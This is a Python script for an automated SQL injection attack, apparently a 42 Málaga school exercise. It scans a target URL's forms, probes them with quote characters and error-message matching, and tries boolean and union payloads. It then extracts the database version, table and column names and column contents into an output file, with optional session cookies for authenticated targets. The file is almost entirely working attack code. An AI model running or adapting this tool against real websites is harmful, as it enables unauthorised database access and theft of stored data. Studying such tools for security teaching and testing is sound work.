import argparse
import requests
from injections import injections
from urllib.parse import urljoin
import urllib
from bs4 import BeautifulSoup as bs

request_type = "get"
s = requests.Session()
s.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
injection_type = 0

def select_injection(url, data, names, method):
    global injection_type
    print("Testing Boolean injections")
    check_injections_list(url, data, names, method, injections["numeric"])
    check_injections_list(url, data, names, method, injections["string"])
    print("Trying Union injections:")
    check_injections_list(url, data, names, method, injections["mysql_num"])
    if check_injections_list(url, data, names, method, injections["mysql_str"]):
        injection_type = 1
    if check_injections_list(url, data, names, method, injections["hsqldb_num"]):
        injection_type = 2
    if check_injections_list(url, data, names, method, injections["hsqldb_str"]):
        injection_type = 3

def check_injections_list(url, data, names, method, injection):
    for i in injection:
        data[names] = i
        try:
            data_url = urllib.parse.urlencode(data, quote_via=urllib.parse.quote)
            if method == "GET":
                r = s.get(url, params=data_url)
            elif method == "POST":
                r = s.post(url, data=data)
        except Exception as e:
            print(e)
            exit()
        if (r.status_code == 404):
            print("404 ERROR")
            exit()
        if not is_vulnerable(r):
            print(f"\tFound injection: {i}")
            return True
    print("\tNot this one :(")
    return False

def is_vulnerable(r):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        # MariaDB
        "malformed",
        # Python
        "unrecognized token",
        "operationalerror",
        # Column mismatch
        "column number mismatch",
        "statements have a different number of columns",
        "data exception: invalid",
        ": unexpected token",
        ": unknown token",
        "unknown table",
        "unexpected token: dbms",
        '"output" : null',
        "feedback-negative'>unknown token",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in r.content.decode().lower():
            return True
    # no error detected
    return False

def get_form_info(form):
    info = {}
    try:
        info["action"] = form.attrs.get("action").lower()
    except:
        info["action"] = None
    info["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    info["inputs"] = inputs
    return info

def get_forms(url):
    try:
        r = s.get(url)
    except Exception as e:
        print(e)
        exit()
    if (r.status_code == 404):
        print("URL Error")
        exit()
    soup = bs(r.content, "html.parser")
    return soup.find_all("form")

def scan_url(url):
    vuln = False
    forms = get_forms(url)
    print("Detected {} forms on {}".format(len(forms), url))
    for form in forms:
        form_info = get_form_info(form)
        for i in "\"'":
            data = {}
            names = []
            for input_tag in form_info["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"] + i
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    if input_tag["name"] != "user_token":
                        names.append(input_tag["name"])
                    data[input_tag["name"]] = f"test{i}"
            url = urljoin(url, form_info["action"])
            if form_info["method"] == "post":
                r = s.post(url, data=data)
            elif form_info["method"] == "get":
                r = s.get(url, params=data)
            if is_vulnerable(r):
                vuln = True
                print("The URL is vulnerable to SQL Injection")
                for i in names:
                    select_injection(url, data, i, form_info["method"].upper())
        if not vuln:
            print("The URL doesn't seems to be vulnerable")
            exit()
            

def cookies(cookie):
    try:
        name, value = cookie.split("=")
        s.cookies.set(name=name, value=value)
    except:
        print("Error setting cookies...")
        exit()

def get_info(url, method="GET"):
    global injection_type
    from injections import inject_dump

    if injection_type == 1:
        inject = inject_dump["sql"]
    if injection_type == 2:
        inject = inject_dump["hsqldb_n"]
    if injection_type == 3:
        inject = inject_dump["hsqldb"]
    info = {}
    data = {}
    try:
        token = '0'
        forms = get_forms(url)
        details = get_form_info(forms[0])
        for input_tag in details["inputs"]:
            if input_tag["name"] == "user_token":
                token = input_tag["value"]
        data = {inject["key"]: inject["version"], "Submit": "Submit", "user_token": token}
        if method == "GET":
            r = s.get(url, params=data)
        else:
            r = s.post(url, data=data)
        soup = bs(r.content, "html.parser")
        info["version"] = soup.text.split("42malaga")[1]
    except Exception as e:
        print(e)
        exit()
    data[inject["key"]] = inject["tables"]
    if method == "GET":
        soup = bs(s.get(url, params=data).content, "html.parser")
    elif method == "POST":
        soup = bs(s.post(url, data=data).content, "html.parser")
    pieces = soup.text.split("42malaga")
    info["database"] = pieces[3][:pieces[3].find("telefonica")]
    info["tables"] = []
    for piece in pieces[1::2]:
        if piece.find("'telefonica'") != -1:
            continue
        b, tab = piece.split("telefonica")
        info["tables"].append(tab)
    data[inject["key"]] = inject["columns"]
    if method == "GET":
        soup = bs(s.get(url, params=data).content, "html.parser")
    elif method == "POST":
        soup = bs(s.post(url, data=data).content, "html.parser")
    pieces = soup.text.split("42malaga")
    info["columns"] = []
    for piece in pieces[1::2]:
        if piece.find("'telefonica'") != -1:
            continue
        col = piece.split("telefonica")
        info["columns"].append(col)
    info["data"] = []
    for col in info["columns"]:
        if col[0].isupper(): # Accessing table
            continue
        payload = inject["payload"].format(tab=col[0], col=col[1])
        data[inject["key"]] = payload
        if method == "GET":
            soup = bs(s.get(url, params=data).content, "html.parser")
        elif method == "POST":
            soup = bs(s.post(url, data=data).content, "html.parser")
        pieces = soup.text.split("42malaga")
        for piece in pieces[1::2]:
            if piece.find(f"',{col[1]},'") != -1:
                continue
            entry = []
            entry.append(col[1])
            entry.append(piece)
            info["data"].append(entry)
    return info


def save_infile(info, filename):
    try:
        with open(filename, "w") as f:
            try:
                f.write(f"DATABASE VERSION: {info['version']}\n")
                f.write(f"DATABASE NAME: {info['database']}\n")
                f.write("\nTABLES NAMES\n")
                for table in info["tables"]:
                    f.write(f"{table}\n")
                f.write("\nCOLUMNS NAMES:\n")
                for column in info["columns"]:
                    f.write(f"TABLE: {column[0]:<25} COLUMN: {column[1]}\n")
                f.write(f"\nDUMP DATA:\n")
                for data in info["data"]:
                    f.write(f"COLUMN: {data[0]:<20} DATA: {data[1]}\n")
            except:
                print("Couldn't save information in outfile :(")
                exit()
    except:
        print("Error creating/opening outfile :(")
        exit()

def main():
    global request_type, s
    parser = argparse.ArgumentParser()
    parser.add_argument("-o",
                      default="outfile",
                      help="output file, if not specified outfile will be used")
    parser.add_argument("-X",
                      default="GET",
                      help="Request type, if not specified GET will be used")
    parser.add_argument("url",
                      help="URL to scan")
    parser.add_argument("-c",
                        "--cookie",
                      type=str,
                      help="Logon cookie")
    args = parser.parse_args()

    if (args.X != "GET" and args.X != "POST"):
        print("The request method isn't 'GET' or 'POST'")
        exit()
    if args.cookie:
        cookies(args.cookie)
    if not args.X:
        args.X = "GET"
    if args.X:
        if args.X == "GET" or args.X == "POST":
            request_type = args.X
        else:
            print("Only GET and POST requests are accepted")
            exit()
    if args.url:
        print("Scanning URL: " + args.url)
        scan_url(args.url)
        save_infile(get_info(args.url, args.X), args.o)
    else:
        print("Please, give URL")
        exit()

if __name__ == '__main__':
    main()